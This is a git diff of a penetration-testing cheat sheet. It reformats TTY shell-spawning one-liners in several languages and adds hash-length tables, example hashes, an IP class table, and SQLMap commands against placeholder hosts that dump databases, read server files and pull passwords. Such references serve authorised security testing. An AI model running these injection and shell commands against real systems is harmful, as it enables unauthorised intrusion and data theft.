@@ -1,27 +1,27 @@
 #Kali-Help-Sheet
 
 # TTY Shells
-## Python TTY Shell Trick
+## Python TTY Shell Trick:
 `python -c 'import pty;pty.spawn("/bin/bash")'`
 
 `python3 -c 'import pty;pty.spawn("/bin/bash")'`
 
-##Spawn Interactive sh shell
+Spawn Interactive sh shell:
 `/bin/sh -i`
 
-##Spawn Perl TTY Shell
+Spawn Perl TTY Shell:
 `perl -e 'exec "/bin/sh";'`
 
-##Spawn Ruby TTY Shel
+Spawn Ruby TTY Shel:
 `ruby -e 'exec "/bin/sh"'`
 
-##Spawn Lua TTY Shell
+Spawn Lua TTY Shell:
 `lua -e 'os.execute("/bin/sh")'`
 
-##Spawn TTY Shell from Vi
+Spawn TTY Shell from Vi:
 `:!bash`
 
-##Spawn TTY Shell from NMAP
+Spawn TTY Shell from NMAP:
 `!sh`
 
 # 🕵️ Recon and Enumeration
@@ -104,4 +104,41 @@ Nmap (“Network Mapper”) is a free and open-source utility for network discov
 | `process.h, string.h, winbase.h, windows.h, winsock2.h` | Windows |
 | `arpa/inet.h, fcntl.h, netdb.h, netinet/in.h, sys/socket.h, sys/types.h, unistd.h` | Linux   |
 
+# Cryptography 🔒 - Hash Lengths
+
+| Hash   | Size      |
+|--------|-----------|
+| MD5    | 16 Bytes  |
+| SHA-1  | 20 Bytes  |
+| SHA-256| 32 Bytes  |
+| SHA-512| 64 Bytes  |
+
+# Hash Examples
+
+| Hash            | Example                                                           |
+|-----------------|-------------------------------------------------------------------|
+| MD5             | 8743b52063cd84097a65d1633f5c74f5                                  |
+| SHA1            | b89eaac7e61417341b710b727768294d0e6a277b                          |
+| SHA-256         | 127e6fbfe24a750e72930c220a8e138275656b8e5d8f48a98c3c92df2caba935  |
+| SHA-512         | 82a9dda829eb7f8ffe9fbe49e45d47d2dad9664fbb7adf72492e3c81ebd3e29134d9bc12212bf83c6840f10e8246b9db54a4859b7ccd0123d86e5872c1e5082f |
+
+# SQLMap Examples 🐛
+
+| Command                                                                                      | Description                                                                                      |
+|----------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------|
+| `sqlmap -u http://meh.com --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3` | Automated sqlmap scan                                                                           |
+| `sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords --file-read="/var/www/blah.php"` | Targeted sqlmap scan                                                                        |
+| `sqlmap -u "http://meh.com/meh.php?id=1" --dbms=mysql --tech=U --random-agent --dump`         | Scan URL for union + error-based injection with MySQL backend and use a random user agent + database dump |
+| `sqlmap -o -u "http://meh.com/form/" --forms`                                                 | SQLMap check form for injection                                                                  |
+| `sqlmap -o -u "http://meh/vuln-form" --forms -D database-name -T users --dump`                 | SQLMap dump and crack hashes for table users on database-name                                     |
+
+╔════════╦═════════════════════════╗
+║ Class  ║   IP Address Range       ║
+╠════════╬═════════════════════════╣
+║ Class A 1️⃣ ║ 0.0.0.0 – 127.255.255.255 ║
+║ Class B 2️⃣ ║ 128.0.0.0 – 191.255.255.255 ║
+║ Class C 3️⃣ ║ 192.0.0.0 – 223.255.255.255 ║
+║ Class D 4️⃣ ║ 224.0.0.0 – 239.255.255.255 ║
+║ Class E 5️⃣ ║ 240.0.0.0 – 255.255.255.255 ║
+╚════════╩═════════════════════════╝
 
